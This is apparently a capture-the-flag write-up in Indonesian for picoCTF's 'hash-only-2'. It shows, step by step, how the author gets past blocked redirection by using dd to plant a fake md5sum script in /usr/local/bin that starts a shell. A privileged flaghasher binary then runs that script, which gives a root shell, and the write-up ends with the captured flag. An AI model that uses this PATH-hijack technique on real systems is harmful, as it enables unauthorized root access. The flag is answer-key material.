# hash-only-2
## Problem
Sama seperti dengan hash-only-1 akan tetapi memiliki restriksi tambahan, yaitu: 
* Tidak bisa redirect output 
* Tidak bisa mengubah file PATH
* flaghasher bukan di ~/ melainkan di /usr/bin/
## Diketahui
Restriksi tambahan dan penanggulangannya: 
* Tidak bisa redirect output\
Kita bisa mengedit isi file menggunakan dd

* Tidak bisa mengubah file PATH\
Kita bisa mengubah isi direktori /usr/local/bin/
```
ctf-player@pico-chall$ cat $PATH
cat: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin': No such file or directory
```

* flaghasher bukan di ~/ melainkan di /usr/bin/ \
Tidak masalah


## Hasil
```
ctf-player@pico-chall$ cat $PATH
cat: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin': No such file or directory
ctf-player@pico-chall$ touch /usr/local/bin/md5sum
ctf-player@pico-chall$ printf '#!/bin/sh\nsh\n' | dd of=/usr/local/bin/md5sum bs=1 count=40
13+0 records in
13+0 records out
13 bytes copied, 9.804e-05 s, 133 kB/s
ctf-player@pico-chall$ chmod +x /usr/local/bin/md5sum 
ctf-player@pico-chall$ flaghasher
Computing the MD5 hash of /root/flag.txt.... 

# ls
# cd /
# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev	 home  lib32  libx32  mnt    proc  run	 srv   tmp  var
# cd root
# ls
flag.txt
# cat flag.txt
picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_364b3672}# Connection to rescued-float.picoctf.net closed by remote host.
Connection to rescued-float.picoctf.net closed.

```